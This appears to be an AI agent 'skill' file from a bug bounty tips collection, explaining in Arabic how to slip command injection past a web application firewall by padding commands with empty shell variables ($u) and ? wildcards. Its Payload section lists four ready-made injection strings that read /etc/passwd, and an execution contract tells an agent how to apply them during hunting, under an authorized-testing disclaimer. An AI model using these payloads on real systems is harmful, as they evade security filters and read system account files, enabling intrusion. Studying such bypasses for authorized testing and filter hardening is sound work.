# SKILL: RCE WAF Bypass — استخدام \$u والـ wildcards

**Skill id:** `tip/rce-waf-bypass-استخدام-u-والـ-wildcards`  
**Category:** RCE, WAF Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dcdac31e880817a8e79cd9d4c02b621  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **RCE, WAF Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

استخدام متغيرات بيئة فاضية (\$u) و wildcards (?) في shell عشان تكسر السترينج اللي الـ WAF بيدور عليه (زي كلمة cat أو passwd) بدون ما تأثر على تنفيذ الأمر فعليًا.

## Payload / Code

```
;+\$u+cat+/etc\$u/passwd\$u
;+\$u+cat+/etc\$u/passwd+#
/???/??t+/???/??ss??
/?in/cat+/et?/passw?
```

## Source

Ali @darkyfy — #WAF #RCE #Bypass

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
